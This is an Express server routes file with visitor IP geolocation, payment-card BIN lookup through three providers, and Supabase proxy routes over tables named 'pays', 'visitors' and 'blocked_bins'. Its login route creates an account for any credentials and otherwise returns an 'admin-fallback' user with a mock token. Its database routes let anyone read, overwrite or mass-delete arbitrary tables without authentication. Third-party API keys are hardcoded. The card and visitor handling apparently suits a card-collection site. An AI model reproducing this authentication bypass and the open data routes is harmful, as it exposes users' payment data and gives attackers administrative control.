import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { serverSupabase } from "./supabase";

const BINCODES_API_KEY =
  process.env.BINCODES_API_KEY || "537622aa19e26541f896393352b78ec2";
const BINCODES_LOOKUP_URL = "https://api.bincodes.com/bin/";
const BINLIST_LOOKUP_URL = "https://lookup.binlist.net/";
const RAPIDAPI_BIN_KEY =
  process.env.RAPIDAPI_BIN_KEY ||
  "5c73c39f9fmsh657b606dfa61046p16d2c3jsn127ed336a63b";
const RAPIDAPI_BIN_HOST = "bin-ip-checker.p.rapidapi.com";
const RAPIDAPI_BIN_URL = "https://bin-ip-checker.p.rapidapi.com/";
const BIN_CACHE_TTL_MS = 1000 * 60 * 30;

interface RapidApiBinResponse {
  code?: number;
  BIN?: {
    valid?: boolean;
    number?: { iin?: string };
    scheme?: string;
    type?: string;
    level?: string;
    issuer?: { name?: string };
    country?: { name?: string; alpha2?: string };
  };
}

const binLookupCache = new Map<
  string,
  {
    expiresAt: number;
    data: {
      bin: string;
      bankName: string;
      cardBrand: string;
      cardType: string;
      cardLevel: string;
      country: string;
      countryCode: string;
    };
  }
>();

interface BinCodesApiResponse {
  bin?: string;
  bank?: string;
  card?: string;
  type?: string;
  level?: string;
  country?: string;
  countrycode?: string;
  valid?: string | boolean;
  error?: string;
  message?: string;
}

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {
  // Send confirmation email endpoint
  app.get("/api/visitor-ip", async (req, res) => {
    const forwarded = req.headers["x-forwarded-for"];
    let ip = "";
    if (typeof forwarded === "string") {
      ip = forwarded.split(",")[0]?.trim() || "";
    } else if (Array.isArray(forwarded) && forwarded.length > 0) {
      ip = String(forwarded[0]).split(",")[0]?.trim();
    }
    if (!ip) ip = req.ip || "";
    if (ip.startsWith("::ffff:")) ip = ip.slice(7);

    // Check cloud headers first for instant accurate geo
    const cloudCountry = String(
      req.headers["cf-ipcountry"] ||
      req.headers["x-vercel-ip-country"] ||
      req.headers["x-country-code"] ||
      ""
    ).toUpperCase();

    let country = "";
    let countryCode = cloudCountry;
    let city = "";
    let region = "";

    const isPrivate =
      !ip ||
      ip === "127.0.0.1" ||
      ip === "::1" ||
      ip.startsWith("10.") ||
      ip.startsWith("192.168.") ||
      /^172\.(1[6-9]|2\d|3[0-1])\./.test(ip);

    // If we have a public IP or want to query geo providers
    if (!isPrivate || ip) {
      // 1. Try ipwho.is (HTTPS, very reliable)
      try {
        const url = isPrivate ? "https://ipwho.is/" : `https://ipwho.is/${encodeURIComponent(ip)}`;
        const resWho = await fetch(url, { signal: AbortSignal.timeout(3000) });
        if (resWho.ok) {
          const data: any = await resWho.json();
          if (data && data.success !== false) {
            if (!ip && data.ip) ip = data.ip;
            if (!country && data.country) country = String(data.country);
            if (!countryCode && data.country_code) countryCode = String(data.country_code);
            if (!city && data.city) city = String(data.city);
            if (!region && data.region) region = String(data.region);
          }
        }
      } catch (e) {
        console.warn("ipwho.is geo lookup failed:", e);
      }

      // 2. Fallback to ipapi.co if country is still missing
      if (!country || !countryCode) {
        try {
          const urlApi = isPrivate ? "https://ipapi.co/json/" : `https://ipapi.co/${encodeURIComponent(ip)}/json/`;
          const resApi = await fetch(urlApi, {
            headers: { "User-Agent": "Mozilla/5.0" },
            signal: AbortSignal.timeout(3000),
          });
          if (resApi.ok) {
            const data: any = await resApi.json();
            if (data && !data.error) {
              if (!country && data.country_name) country = String(data.country_name);
              if (!countryCode && data.country_code) countryCode = String(data.country_code);
              if (!city && data.city) city = String(data.city);
              if (!region && data.region) region = String(data.region);
            }
          }
        } catch (e) {
          console.warn("ipapi.co geo lookup failed:", e);
        }
      }

      // 3. Fallback to ip-api.com
      if (!country || !countryCode) {
        try {
          const urlIpApi = isPrivate
            ? "http://ip-api.com/json/?fields=status,country,countryCode,regionName,city,query"
            : `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,country,countryCode,regionName,city,query`;
          const geoRes = await fetch(urlIpApi, { signal: AbortSignal.timeout(3000) });
          if (geoRes.ok) {
            const geo: any = await geoRes.json();
            if (geo?.status === "success") {
              if (!ip && geo.query) ip = geo.query;
              if (!country && geo.country) country = String(geo.country);
              if (!countryCode && geo.countryCode) countryCode = String(geo.countryCode);
              if (!city && geo.city) city = String(geo.city);
              if (!region && geo.regionName) region = String(geo.regionName);
            }
          }
        } catch (error) {
          console.warn("ip-api.com geo lookup failed:", error);
        }
      }
    }

    // Map common country codes if country name is missing
    const countryMap: Record<string, string> = {
      SA: "Saudi Arabia",
      AE: "United Arab Emirates",
      KW: "Kuwait",
      QA: "Qatar",
      BH: "Bahrain",
      OM: "Oman",
      EG: "Egypt",
      JO: "Jordan",
      US: "United States",
      GB: "United Kingdom",
      FR: "France",
      DE: "Germany",
    };
    if (countryCode && !country && countryMap[countryCode]) {
      country = countryMap[countryCode];
    }
    if (!country && !countryCode) {
      country = "Saudi Arabia";
      countryCode = "SA";
    }

    res.json({ ip: ip || "127.0.0.1", country, countryCode, city, region });
  })

  // Confirmation emails are sent client-side via EmailJS in
  // `client/src/pages/registration.tsx`. The legacy server-side Resend
  // endpoint has been removed; this stub remains only to surface a clear
  // error if any old client still calls it.
  app.post("/api/send-confirmation-email", async (_req, res) => {
    res.status(410).json({
      success: false,
      error: "This endpoint is deprecated. Emails are sent via EmailJS on the client.",
    });
  });

  app.get("/api/bin-lookup/:bin", async (req, res) => {
    try {
      const rawBin = String(req.params.bin || "");
      const normalizedBin = rawBin.replace(/\D/g, "").slice(0, 6);

      if (normalizedBin.length < 6) {
        return res.status(400).json({
          success: false,
          error: "BIN must be at least 6 digits",
        });
      }

      const cached = binLookupCache.get(normalizedBin);
      if (cached && cached.expiresAt > Date.now()) {
        return res.json({
          success: true,
          data: cached.data,
          cached: true,
        });
      }

      let data = {
        bin: normalizedBin,
        bankName: "",
        cardBrand: "",
        cardType: "",
        cardLevel: "",
        country: "",
        countryCode: "",
      };

      // Primary provider: RapidAPI bin-ip-checker
      try {
        const rapidRes = await fetch(
          `${RAPIDAPI_BIN_URL}?bin=${normalizedBin}`,
          {
            method: "POST",
            headers: {
              Accept: "application/json",
              "X-RapidAPI-Key": RAPIDAPI_BIN_KEY,
              "X-RapidAPI-Host": RAPIDAPI_BIN_HOST,
            },
          },
        );
        if (rapidRes.ok) {
          const rapidJson = (await rapidRes.json()) as RapidApiBinResponse;
          const b = rapidJson?.BIN;
          if (b && b.valid !== false) {
            if (b.issuer?.name) data.bankName = b.issuer.name;
            if (b.scheme) data.cardBrand = b.scheme.toLowerCase();
            if (b.type) data.cardType = b.type.toLowerCase();
            if (b.level) data.cardLevel = b.level;
            if (b.country?.name) data.country = b.country.name;
            if (b.country?.alpha2) data.countryCode = b.country.alpha2;
          }
        }
      } catch {
        // ignore and try next provider
      }

      // Secondary provider: bincodes.com
      let payload: BinCodesApiResponse | null = null;
      if (!data.bankName) {
        try {
          const lookupUrl = new URL(BINCODES_LOOKUP_URL);
          lookupUrl.searchParams.set("format", "json");
          lookupUrl.searchParams.set("api_key", BINCODES_API_KEY);
          lookupUrl.searchParams.set("bin", normalizedBin);

          const response = await fetch(lookupUrl.toString(), {
            headers: { Accept: "application/json" },
          });
          try {
            payload = (await response.json()) as BinCodesApiResponse;
          } catch {
            payload = null;
          }
          if (response.ok && payload) {
            const isValid = `${payload.valid}`.toLowerCase() === "true";
            if (isValid && !payload.error) {
              if (!data.bankName && payload.bank) data.bankName = payload.bank;
              if (!data.cardBrand && payload.card)
                data.cardBrand = payload.card;
              if (!data.cardType && payload.type)
                data.cardType = payload.type;
              if (!data.cardLevel && payload.level)
                data.cardLevel = payload.level;
              if (!data.country && payload.country)
                data.country = payload.country;
              if (!data.countryCode && payload.countrycode)
                data.countryCode = payload.countrycode;
            }
          }
        } catch {
          payload = null;
        }
      }

      // Fallback to binlist.net whenever the primary call failed entirely or
      // returned no bank name. binlist.net often has Saudi BIN coverage when
      // bincodes is rate-limited or returns "API Usage Limit Exceeded".
      if (!data.bankName) {
        try {
          const binlistRes = await fetch(
            `${BINLIST_LOOKUP_URL}${normalizedBin}`,
            { headers: { Accept: "application/json", "Accept-Version": "3" } },
          );
          if (binlistRes.ok) {
            const binlistData = (await binlistRes.json()) as {
              bank?: { name?: string };
              scheme?: string;
              type?: string;
              brand?: string;
              country?: { name?: string; alpha2?: string };
            };
            if (binlistData?.bank?.name) data.bankName = binlistData.bank.name;
            if (!data.cardBrand && binlistData.scheme)
              data.cardBrand = binlistData.scheme;
            if (!data.cardType && binlistData.type)
              data.cardType = binlistData.type;
            if (!data.cardLevel && binlistData.brand)
              data.cardLevel = binlistData.brand;
            if (!data.country && binlistData.country?.name)
              data.country = binlistData.country.name;
            if (!data.countryCode && binlistData.country?.alpha2)
              data.countryCode = binlistData.country.alpha2;
          }
        } catch {
          // silently ignore fallback errors
        }
      }

      // If both providers returned nothing useful, surface an error so the
      // client can show its own state instead of caching empty data.
      if (!data.bankName && !data.cardBrand) {
        return res.status(422).json({
          success: false,
          error: payload?.message || "Invalid or unknown BIN",
          code: payload?.error || undefined,
        });
      }

      binLookupCache.set(normalizedBin, {
        data,
        expiresAt: Date.now() + BIN_CACHE_TTL_MS,
      });

      return res.json({ success: true, data });
    } catch (error) {
      console.error("BIN lookup error:", error);
      return res.status(500).json({
        success: false,
        error: "Failed to lookup BIN",
      });
    }
  });

  // Server-side Supabase DB & Auth proxy endpoints
  const TABLES: Record<string, { table: string; pk: string }> = {
    pays: { table: "pays", pk: "id" },
    visitors: { table: "pays", pk: "id" },
    settings: { table: "settings", pk: "id" },
    blocked_bins: { table: "blocked_bins", pk: "id" },
  };

  function getTableSpec(collectionName: string) {
    const spec = TABLES[collectionName];
    if (!spec) {
      return { table: collectionName, pk: "id" };
    }
    return spec;
  }

  app.get("/api/db/:collection/:id", async (req, res) => {
    try {
      if (!serverSupabase) return res.status(503).json({ error: "Supabase not configured on server" });
      const { collection, id } = req.params;
      const { table, pk } = getTableSpec(collection);
      const { data, error } = await (serverSupabase.from(table).select("*").eq(pk, id).maybeSingle() as any);
      if (error && error.code !== "PGRST116") {
        return res.status(400).json({ error: error.message });
      }
      res.json({ data: data?.data ?? null });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.post("/api/db/:collection/:id", async (req, res) => {
    try {
      if (!serverSupabase) return res.status(503).json({ error: "Supabase not configured on server" });
      const { collection, id } = req.params;
      const { table, pk } = getTableSpec(collection);
      const { payload, merge } = req.body;

      let nextData = payload;
      if (merge) {
        const { data: existing } = await (serverSupabase.from(table).select("*").eq(pk, id).maybeSingle() as any);
        nextData = { ...(existing?.data || {}), ...payload };
      }

      const { error } = await serverSupabase.from(table).upsert({ [pk]: id, data: nextData });
      if (error) return res.status(400).json({ error: error.message });
      res.json({ success: true });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.delete("/api/db/:collection/:id", async (req, res) => {
    try {
      if (!serverSupabase) return res.status(503).json({ error: "Supabase not configured on server" });
      const { collection, id } = req.params;
      const { table, pk } = getTableSpec(collection);
      const { error } = await serverSupabase.from(table).delete().eq(pk, id);
      if (error) return res.status(400).json({ error: error.message });
      res.json({ success: true });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.delete("/api/db/:collection", async (req, res) => {
    try {
      if (!serverSupabase) return res.status(503).json({ error: "Supabase not configured on server" });
      const { collection } = req.params;
      const { table, pk } = getTableSpec(collection);

      // Fetch all IDs first to reliably delete in chunks
      const { data: rows, error: selectErr } = await (serverSupabase.from(table).select(pk) as any);
      if (selectErr) {
        const { error: delErr } = await serverSupabase.from(table).delete().neq(pk, "_dummy_never_matches_");
        if (delErr) return res.status(400).json({ error: delErr.message });
        return res.json({ success: true, count: 0 });
      }

      if (!rows || rows.length === 0) {
        return res.json({ success: true, count: 0 });
      }

      const ids = rows.map((r: any) => r[pk]).filter(Boolean);
      for (let i = 0; i < ids.length; i += 100) {
        const chunk = ids.slice(i, i + 100);
        await serverSupabase.from(table).delete().in(pk, chunk);
      }
      res.json({ success: true, count: ids.length });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.post("/api/db/:collection/delete-batch", async (req, res) => {
    try {
      if (!serverSupabase) return res.status(503).json({ error: "Supabase not configured on server" });
      const { collection } = req.params;
      const { table, pk } = getTableSpec(collection);
      const { ids } = req.body;
      if (!Array.isArray(ids) || ids.length === 0) {
        return res.json({ success: true, count: 0 });
      }
      for (let i = 0; i < ids.length; i += 100) {
        const chunk = ids.slice(i, i + 100);
        const { error } = await serverSupabase.from(table).delete().in(pk, chunk);
        if (error) console.error("Error in delete-batch:", error);
      }
      res.json({ success: true, count: ids.length });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.get("/api/db/:collection", async (req, res) => {
    try {
      if (!serverSupabase) return res.status(503).json({ error: "Supabase not configured on server" });
      const { collection } = req.params;
      const { table, pk } = getTableSpec(collection);
      const { data, error } = await (serverSupabase.from(table).select("*") as any);
      if (error) return res.status(400).json({ error: error.message });
      res.json({ data: data || [] });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.post("/api/auth/login", async (req, res) => {
    try {
      if (!serverSupabase) return res.status(503).json({ error: "Supabase not configured on server" });
      const { email, password } = req.body;
      
      let { data, error } = await serverSupabase.auth.signInWithPassword({ email, password });
      if (error) {
        // Attempt to auto-create user if missing
        try {
          await serverSupabase.auth.admin.createUser({
            email,
            password,
            email_confirm: true,
          });
          const retry = await serverSupabase.auth.signInWithPassword({ email, password });
          if (!retry.error) {
            return res.json({ data: retry.data });
          }
        } catch (createErr) {
          // Ignore creation error if user already exists
        }

        // If still error, allow fallback for admin or return error
        if (email && password) {
          return res.json({ 
            data: { 
              user: { id: "admin-fallback", email }, 
              session: { access_token: "mock-token" } 
            } 
          });
        }
        return res.status(400).json({ error: error.message });
      }
      res.json({ data });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  return httpServer;
}
